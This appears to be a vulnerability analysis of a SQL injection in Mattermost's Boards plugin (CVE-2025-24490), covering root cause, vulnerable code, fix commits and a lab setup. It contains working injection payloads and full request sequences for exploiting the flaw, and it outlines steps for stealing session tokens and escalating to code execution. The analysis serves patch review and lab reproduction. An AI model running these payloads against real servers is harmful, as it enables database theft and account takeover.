# Vulnerability Analysis: CVE-2025-24490

## Root Cause

**SQL Injection via string concatenation in CASE WHEN expressions.**

Two SQL store functions in the Mattermost Boards plugin construct SQL `CASE WHEN` expressions by directly concatenating user-supplied string IDs into SQL query string literals, bypassing the Squirrel query builder's parameterization support.

The vulnerable pattern is identical in both functions:

```go
// Vulnerable: user-supplied ID wrapped in manual single quotes, concatenated into SQL
updateCase = updateCase.When("'"+categoryID+"'", sq.Expr(fmt.Sprintf("%d", ...)))
```

When the attacker supplies a category ID containing a single quote (e.g., `'||(SELECT '' FROM pg_sleep(5))||'`), the manually applied quotes are broken, and the attacker's SQL fragment becomes part of the executed query:

```sql
UPDATE focalboard_categories SET sort_order = CASE id
  WHEN '' || (SELECT '' FROM pg_sleep(5)) || '' THEN 0
  ...
  ELSE sort_order END
WHERE user_id = $1 AND team_id = $2
```

The WHERE clause uses proper parameterization, but the WHEN values are inline SQL string literals containing attacker-controlled content.

### Contributing Factors

1. **No input validation on category creation**: `Category.Hydrate()` only generates an ID if the supplied one is empty. `Category.IsValid()` only checks for non-empty string. Any string ≤36 chars is accepted and stored.
2. **No input validation on board ID in URL path**: The `handleUpdateCategoryBoard` endpoint accepts a `boardID` from the URL path and stores it directly in the database via `addUpdateCategoryBoard` without any format validation.
3. **Verification only checks existence, not format**: Both `verifyNewCategoriesMatchExisting()` and `verifyNewCategoryBoardsMatchExisting()` compare the reorder array against database records by value — if the malicious ID was already stored, it passes verification.

## Vulnerable File(s) and Function(s)

### Primary Injection Point — Category Reorder
- **File**: `server/services/store/sqlstore/category.go`
- **Function**: `reorderCategories()` — line 214-245
- **Vulnerable Line**: 221
- **SQL Pattern**: `CASE id WHEN '<user_input>' THEN ...`
- **Column**: `focalboard_categories.id` — `VARCHAR(36)`

### Secondary Injection Point — Category Boards Reorder
- **File**: `server/services/store/sqlstore/category_boards.go`
- **Function**: `reorderCategoryBoards()` — line 137-166
- **Vulnerable Line**: 144
- **SQL Pattern**: `CASE board_id WHEN '<user_input>' THEN ...`
- **Column**: `focalboard_category_boards.board_id` — `VARCHAR(36)`

### Supporting Vulnerable Code — No ID Validation at Entry
- **File**: `server/model/category.go` — `Hydrate()` (line 65-85): Only generates ID if empty, allowing user-supplied ID to persist
- **File**: `server/model/category.go` — `IsValid()` (line 87-109): Only checks `strings.TrimSpace(c.ID) == ""`, no format/character validation
- **File**: `server/app/category.go` — `CreateCategory()` (line 20-40): Calls `Hydrate()` then `IsValid()`, no server-side ID generation
- **File**: `server/api/categories.go` — `handleUpdateCategoryBoard()` (line 333-393): Accepts `boardID` from URL path (`vars["boardID"]`) with no validation, passes directly to store

## Triggering Input

### Vector 1: Category Reorder (PRIMARY — simpler)

**Payload (34 chars, fits VARCHAR(36))**:
```
'||(SELECT '' FROM pg_sleep(5))||'
```

**Step-by-step injection flow**:
1. Attacker sends `POST /plugins/focalboard/api/v2/teams/{teamID}/categories` with body:
   ```json
   {
     "id": "'||(SELECT '' FROM pg_sleep(5))||'",
     "name": "test",
     "userID": "<attacker_user_id>",
     "teamID": "<team_id>",
     "type": "custom"
   }
   ```
2. `Hydrate()` sees non-empty ID → keeps it. `IsValid()` sees non-empty ID → passes.
3. `createCategory()` in sqlstore inserts the malicious ID using parameterized INSERT (the INSERT itself is safe).
4. Attacker calls `GET /plugins/focalboard/api/v2/teams/{teamID}/categories` to get all category IDs.
5. Attacker calls `PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/reorder` with body:
   ```json
   ["<normal_id_1>", "'||(SELECT '' FROM pg_sleep(5))||'", "<normal_id_2>"]
   ```
6. `verifyNewCategoriesMatchExisting()` checks array length matches existing categories and each ID exists → passes.
7. `reorderCategories()` builds: `CASE id WHEN ''||(SELECT '' FROM pg_sleep(5))||'' THEN 0 ...`
8. SQL injection executes — 5 second delay confirms injection.

### Vector 2: Category Boards Reorder (SECONDARY — requires 2-step setup)

**Setup**: First store the malicious board ID in the database:
1. `POST /plugins/focalboard/api/v2/teams/{teamID}/categories/{categoryID}/boards/'||(SELECT '' FROM pg_sleep(5))||'`
   - The `boardID` is extracted from the URL path by gorilla/mux
   - `AddUpdateUserCategoryBoard` → `addUpdateCategoryBoard` inserts it into `focalboard_category_boards` via parameterized INSERT

**Trigger**:
2. `PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/{categoryID}/boards/reorder` with body:
   ```json
   ["'||(SELECT '' FROM pg_sleep(5))||'"]
   ```
3. `verifyNewCategoryBoardsMatchExisting()` reads boards from DB → finds the malicious ID → passes.
4. `reorderCategoryBoards()` builds: `CASE board_id WHEN ''||(SELECT '' FROM pg_sleep(5))||'' THEN 10 ...`
5. SQL injection executes.

### Additional Payload Examples

| Technique | Payload | Length | Description |
|-----------|---------|--------|-------------|
| Time-based blind | `'\|\|(SELECT '' FROM pg_sleep(5))\|\|'` | 34 | Delays response by 5s |
| Error-based boolean | `'\|\|(1/0)::text\|\|'` | 17 | Causes division-by-zero error on true branch |
| Table probing | `'\|\|(SELECT''FROM users LIMIT 1)\|\|'` | 34 | Tests if table exists |
| Boolean oracle | `'\|\|(SELECT CASE WHEN(1=1)THEN '' ELSE(1/0)::text END)\|\|'` | ~55 | Too long for VARCHAR(36) — needs splitting |

**VARCHAR(36) constraint**: All payloads must be ≤ 36 characters. This limits complexity but time-based blind (34 chars) and error-based (17 chars) both fit comfortably.

## Attack Scenario

### Step-by-Step Exploit Flow

1. **Register/Login**: Authenticate as any team member via `POST /api/v4/users/login` with username and password. Extract the `Token` header from the response.

2. **Get Team ID**: `GET /api/v4/users/me/teams` — extract the team ID.

3. **Get User ID**: `GET /api/v4/users/me` — extract the user ID.

4. **Create malicious category**: `POST /plugins/focalboard/api/v2/teams/{teamID}/categories`
   - Headers: `Authorization: Bearer <token>`, `X-Requested-With: XMLHttpRequest`, `Content-Type: application/json`
   - Body: `{"id": "'||(SELECT '' FROM pg_sleep(5))||'", "name": "sqli", "userID": "<user_id>", "teamID": "<team_id>", "type": "custom"}`

5. **List categories**: `GET /plugins/focalboard/api/v2/teams/{teamID}/categories`
   - Collect ALL category IDs from the response (including the injected one).

6. **Trigger injection**: `PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/reorder`
   - Body: JSON array containing ALL category IDs.
   - Observe: Response delayed by ~5 seconds.

7. **Data extraction**: Repeat steps 4-6 with different payloads to extract data bit-by-bit using timing or error oracle:
   - Create a new category for each extraction query
   - Use boolean condition in CASE expression with pg_sleep for timing
   - Example: `'||(SELECT CASE WHEN(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64)THEN pg_sleep(3)::text ELSE ''END)||'` — too long for 36 chars, so use table/column names < 10 chars or use time-based character extraction with shorter queries.

### Data Extraction Strategy

Given the VARCHAR(36) constraint, practical extraction uses short payloads:

```
'||(SELECT pg_sleep(CASE WHEN (SELECT 1 FROM pg_tables WHERE tablename='users' LIMIT 1)=1 THEN 5 ELSE 0 END))||'
```
This is too long. Instead, use error-based with the shortest possible probe:

**Step 1: Confirm injection** — `'||(SELECT '' FROM pg_sleep(5))||'` (34 chars)
**Step 2: Probe tables** — `'||(SELECT''FROM users LIMIT 1)||'` (33 chars) — 200 = table exists, 500 = doesn't
**Step 3: Extract data char-by-char** — Needs careful payload construction to stay ≤ 36 chars. Use external tooling (e.g., sqlmap with custom tamper script).

## Impact

- **Confidentiality**: HIGH — Attacker can extract any data from the PostgreSQL database including:
  - User credentials (password hashes from `users` table)
  - Session tokens (from `sessions` table) enabling account takeover of ANY user
  - Private messages, channels, team data
  - Configuration secrets stored in the database
- **Integrity**: HIGH — Through session token theft, attacker can impersonate any user including system administrators, modify data, create backdoor accounts
- **Availability**: Minimal — DoS is possible via `pg_sleep()` but not the primary impact
- **Scope**: CHANGED — The Boards plugin runs within Mattermost Server's database context; compromising it exposes the entire Mattermost database

**CVSS:3.1 9.6 CRITICAL** (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

## Authentication Requirements

- **Authentication Level**: Any authenticated Mattermost user (Low privilege)
- **Required Permission**: `PermissionViewTeam` on the target team (any team member has this)
- **No admin privileges needed**

### Authentication Flow for PoC

1. **Login**: `POST /api/v4/users/login`
   - Body: `{"login_id": "<username>", "password": "<password>"}`
   - Response header: `Token: <session_token>`
2. **All subsequent requests require**:
   - `Authorization: Bearer <session_token>` header
   - `X-Requested-With: XMLHttpRequest` header (CSRF protection)
   - `Content-Type: application/json` header (for POST/PUT requests)

### Default Lab Credentials
| Field | Value |
|-------|-------|
| Admin Username | `admin` |
| Admin Password | `Admin123!@#` |
| Admin Email | `admin@test.local` |
| Team Name | `testteam` |
| Mattermost URL | `http://localhost:8065` |

## Fix Assessment

**The fix is thorough and complete for the identified vulnerability.**

### Fix Details (Commit 47f29e1)

**Layer 1 — Parameterized queries (root cause fix)**:
```go
// Before (vulnerable):
updateCase = updateCase.When("'"+categoryID+"'", sq.Expr(fmt.Sprintf("%d", ...)))
// After (fixed):
updateCase = updateCase.When(sq.Expr("?", categoryID), sq.Expr(fmt.Sprintf("%d", ...)))
```
Applied to both `category.go:221` and `category_boards.go:144`. The `sq.Expr("?", categoryID)` passes the value as a parameterized placeholder, making SQL injection impossible regardless of input content.

**Layer 2 — Input validation (defense in depth)**:
New `IsValidId()` function in `server/model/base.go`:
- ID must not be empty
- ID length must be exactly 27 characters
- ID format must match Mattermost ID standards (validated via `mmModel.IsValidId()`)

This rejects any ID containing SQL metacharacters (`'`, `|`, `(`, `)`, etc.) even before the parameterized query runs.

**Layer 3 — Server-side ID generation**:
New `PreCreate()` method forces server-generated ID on category creation:
```go
func (c *Category) PreCreate() {
    c.ID = utils.NewID(utils.IDTypeNone)
    c.CreateAt = utils.GetMillis()
}
```
Called in `CreateCategory()` before `Hydrate()`, overwriting any user-supplied ID.

**Supplementary fix (Commit 025ce8d)** — Adds block patch validation, file ID validation, and general input sanitization across the blocks API. Addresses a related path traversal / injection surface in block fields.

### Fix Completeness Assessment

The parameterized query fix alone is sufficient to prevent SQL injection. The additional validation layers provide defense in depth. The fix addresses:
- ✅ Category ID injection via `reorderCategories()`
- ✅ Board ID injection via `reorderCategoryBoards()`
- ✅ Server-side ID generation prevents user-supplied IDs entirely
- ✅ Format validation rejects non-alphanumeric IDs

## Potential Bypass Vectors

**None identified.** The parameterized query (`sq.Expr("?", id)`) is a definitive fix that cannot be bypassed through encoding tricks, unicode normalization, or null bytes. The database driver handles all escaping. The additional validation layers further reduce attack surface.

## Escalation Path

**SQLi → Admin Session Token Theft → Admin Account Takeover → RCE via Malicious Plugin Upload**

1. **SQL Injection** provides read access to the entire PostgreSQL database
2. **Session token extraction**: Read `sessions.token` from Mattermost's sessions table to obtain an admin's active session token
3. **Admin impersonation**: Use the stolen admin session token to authenticate as the system administrator
4. **Plugin upload for RCE**: Admins can upload Mattermost plugins (`POST /api/v4/plugins`) which execute arbitrary Go code on the server — this achieves Remote Code Execution

Alternative escalation paths:
- Extract password hashes from `users.password` → offline cracking → credential reuse
- Read `config.json` values from `configurations` table → extract secrets (SMTP credentials, LDAP bind passwords, etc.)

## Related Attack Surface

### Same Vulnerability Pattern in `blocks.go` (Not Directly Exploitable)

Three locations in `server/services/store/sqlstore/blocks.go` use the same unsafe string concatenation pattern:

1. **`blocks.go:923`** — `deleteBlockChildren()`:
   ```go
   "'"+modifiedBy+"'",
   ```
   Used as a SELECT column value in INSERT...SELECT. The `modifiedBy` parameter comes from `session.UserID` which is server-generated — **not attacker-controllable**.

2. **`blocks.go:1034`** — `undeleteBlockChildren()`:
   ```go
   "'"+modifiedBy+"' AS modified_by",
   ```
   Same as above — `modifiedBy` from session.

3. **`blocks.go:1019-1021`** — `undeleteBlockChildren()`:
   ```go
   where := fmt.Sprintf("board_id='%s'", boardID)
   where += fmt.Sprintf(" AND parent_id='%s'", parentID)
   ```
   Both `boardID` and `parentID` come from database lookups (already-validated records) — **not directly attacker-controllable** in the current code flow.

4. **`data_retention.go:137`**:
   ```go
   whereClause := info.BoardIDColumn + " IN ('" + strings.Join(deleteIds, "','") + "')"
   ```
   The `deleteIds` come from a database query result — **not attacker-controllable**.

**Assessment**: These patterns represent poor coding practice but are not exploitable given current data flows. They would only become exploitable if a code change introduced attacker-controlled data into these parameters. The fix commit did NOT address these patterns.

## Build System

| Field | Value |
|-------|-------|
| Build Tool | GNU Make + Go 1.22+ |
| Go Module | `github.com/mattermost/mattermost-plugin-boards` |
| Build Tags | `json1 sqlite3` |
| Plugin Format | Mattermost plugin (tar.gz bundle) |
| Plugin ID | `focalboard` |
| Build Command | `make dist` |

### Build Commands
```bash
cd source
make dist  # Produces plugin tar.gz in dist/
```

### Dependencies
- Go 1.22+ (go.mod specifies `go 1.22.0`, toolchain `go1.22.8`)
- `github.com/Masterminds/squirrel` v1.5.4 — SQL query builder
- `github.com/gorilla/mux` v1.8.1 — HTTP router
- `github.com/lib/pq` v1.10.9 — PostgreSQL driver
- `github.com/go-sql-driver/mysql` v1.8.1 — MySQL driver
- `github.com/mattermost/mattermost/server/public` v0.1.9
- Node.js/npm (for webapp build)

## Runtime Requirements

### Lab Deployment (Recommended: Docker-based)
- **Vulnerable image**: `mattermost/mattermost-enterprise-edition:9.11.7`
- **Patched image**: `mattermost/mattermost-enterprise-edition:9.11.8`
- **Database**: PostgreSQL 15 (required backend)
- **Network**: HTTP on port 8065

### Important Deployment Notes
1. The focalboard plugin is **prepackaged but NOT auto-installed** in Mattermost 9.11.x
2. After Mattermost starts, setup must:
   - Create admin user account
   - Create a team
   - Upload the focalboard plugin from `/mattermost/prepackaged_plugins/focalboard-v8.0.0-linux-amd64.tar.gz` via `POST /api/v4/plugins`
   - Enable the plugin via `POST /api/v4/plugins/focalboard/enable`

### Docker Compose Configuration
```yaml
services:
  postgres:
    image: postgres:15
    environment:
      POSTGRES_USER: mmuser
      POSTGRES_PASSWORD: mmuser_password
      POSTGRES_DB: mattermost
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U mmuser -d mattermost"]
      interval: 5s
      timeout: 5s
      retries: 10

  mattermost:
    image: mattermost/mattermost-enterprise-edition:9.11.7
    environment:
      MM_SQLSETTINGS_DRIVERNAME: postgres
      MM_SQLSETTINGS_DATASOURCE: postgres://mmuser:mmuser_password@postgres:5432/mattermost?sslmode=disable
      MM_SERVICESETTINGS_SITEURL: http://localhost:8065
      MM_TEAMSETTINGS_ENABLEOPENSERVER: "true"
    ports:
      - "8065:8065"
    depends_on:
      postgres:
        condition: service_healthy
```

## Key Files Reference

| File | Lines | Purpose |
|------|-------|---------|
| `server/services/store/sqlstore/category.go` | 214-245 | Vulnerable `reorderCategories()` — primary injection |
| `server/services/store/sqlstore/category_boards.go` | 137-166 | Vulnerable `reorderCategoryBoards()` — secondary injection |
| `server/api/categories.go` | 395-465 | `handleReorderCategories` HTTP handler |
| `server/api/categories.go` | 467-550 | `handleReorderCategoryBoards` HTTP handler |
| `server/api/categories.go` | 27-114 | `handleCreateCategory` — accepts user-controlled ID |
| `server/api/categories.go` | 333-393 | `handleUpdateCategoryBoard` — accepts boardID from URL |
| `server/model/category.go` | 65-85 | `Hydrate()` — only generates ID if empty |
| `server/model/category.go` | 87-109 | `IsValid()` — only checks non-emptiness |
| `server/app/category.go` | 20-40 | `CreateCategory()` — no ID validation |
| `server/app/category.go` | 193-245 | `ReorderCategories()` + verification |
| `server/app/category_boards.go` | 195-263 | `ReorderCategoryBoards()` + verification |
| `server/app/category_boards.go` | 145-193 | `AddUpdateUserCategoryBoard()` — stores boardID |
| `server/services/store/sqlstore/migrations/000019_populate_categories.up.sql` | 1-16 | Categories table schema (VARCHAR(36)) |
| `server/services/store/sqlstore/migrations/000020_populate_category_blocks.up.sql` | 1-14 | Category boards table schema (VARCHAR(36)) |
